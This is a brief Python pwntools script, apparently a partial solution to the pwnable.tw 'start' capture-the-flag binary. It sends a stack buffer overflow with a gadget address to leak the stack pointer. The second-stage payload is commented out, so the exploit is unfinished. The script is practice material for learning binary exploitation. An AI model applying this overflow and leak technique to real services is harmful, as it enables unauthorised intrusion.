#!/usr/bin/env python
#   WildfootW 2018
#   https://github.com/Wildfoot
#
# open program at local 
# ncat -ve ./a.out -kl 8888

from pwn import *
import time

context.update(arch="i386", os="linux")

host = "127.0.0.1"
port = 8888
#host = "chall.pwnable.tw"
#port = 10000 
r = remote(host, port)

mov_ecx_esp_cts = 0x8048087

input("attach in gdb and press Enter")

payload = flat(["A" * 20, mov_ecx_esp_cts])

print(payload)

r.recvuntil(":")
#r.sendline(payload)
#Tip: \n will cover over esp address
r.send(payload)

time.sleep(1)
esp_base = r.recv(512)[0:4]
print("esp base address :", hex(u32(esp_base)))

# payload
# ---- ---- ---- ---- ---- ret_address ---- ---- ---- ---- ---- ---- ---- ---- ----
#      ^[esp base]    ^[esp base + 12]
#payload = flat(["aaaabaaacaaadaaaeaaa", esp_base, "faaagaaahaaaiaaajaaakaaalaaamaaanaaa"])
r.send(payload)

r.interactive()

